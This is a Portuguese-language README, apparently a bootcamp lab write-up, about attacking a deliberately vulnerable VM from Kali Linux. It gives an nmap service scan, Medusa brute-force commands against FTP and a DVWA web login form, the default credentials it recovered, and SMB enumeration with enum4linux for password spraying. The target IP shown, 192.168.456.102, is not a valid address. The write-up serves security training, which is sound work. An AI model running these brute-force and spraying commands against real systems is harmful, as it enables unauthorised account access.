# Dio-Cybersecurity
Desafios propostos no bootcamp Santander de Cyber segurança
Iniciou-se com a configuração de dois ambientes em VM, um com a distro Kalli do Linux e outra com um ambiente vunerável, sendo configurada comunicação entre ambas.
EM seguida, através da Kalli, testada conexão e serviços abertos com os respectivos comandos PING e nmap -sV   -p 21,22,80,445,139.
Após sucesso, realizada tentativa de conexão ftp, sendo requisitado credenciais até então desconhecidas.
Criados dois arquivos .txt, referentes a possíveis nomes de usuários e senhas para teste.
Com os dois arquivos, utilizou-se a ferramenta Medusa para tentativa de Brute Force com o código:
medusa -h 192.168.456.102 -U users.txt -P pass.txt -M ftp -t 6.
Credencial msfadmin e senha msfadmin descobertas, propiciando acesso ao serviço ftp.
Em seguida, efetuado teste de força bruta em formulários de login web com seguinte código.
medusa -h 192.168.456.102 -U users.txt -P pass.txt -M http \
-m PAGE "/dvwa/login.php" \
-m FORM "username=^USER^&password=^PASS^&login=login" \
-m "FAIL=login failed" -t 6
Obtido sucesso.
Voltando-nos agora para o serviõ SMB, efetuada varredura com o comando Enum4linux e criado listas de usuários e senhas para teste de spraying.

